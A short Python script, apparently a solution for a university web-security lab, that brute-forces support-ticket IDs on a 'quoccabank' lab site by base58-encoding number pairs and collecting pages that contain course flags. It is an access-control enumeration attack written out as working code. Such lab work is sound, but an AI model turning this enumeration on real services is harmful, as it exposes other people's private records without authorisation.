
import requests 
import base58

class Support:
	def run(self):
		results = []
		for i in range(991,10000):
			for j in range(1, 10000):
				original = str(i)+':'+str(j)
				originalB = bytes(original, 'utf-8')
		
				file = str(base58.b58encode(originalB), 'utf-8')
				resp = requests.get('https://support.quoccabank.com/raw/{}'.format(file), cert= ('./6443.pem', './6443.key'))

				print(original, resp.status_code)

				if resp.status_code == 200:
					print(resp.text)
					if 'COMP6443' in resp.text:
						results.append(resp.text)
				else:
					break

		return self.convert(results)

	def convert(self, results):
		res = ''
		for result in results:
			res = res + result + '\n\n'

		print(res)
		return res

	async def test(self, ctx):
		await ctx.send('Test{FLAG}')
		return 'Test{FLAG}'
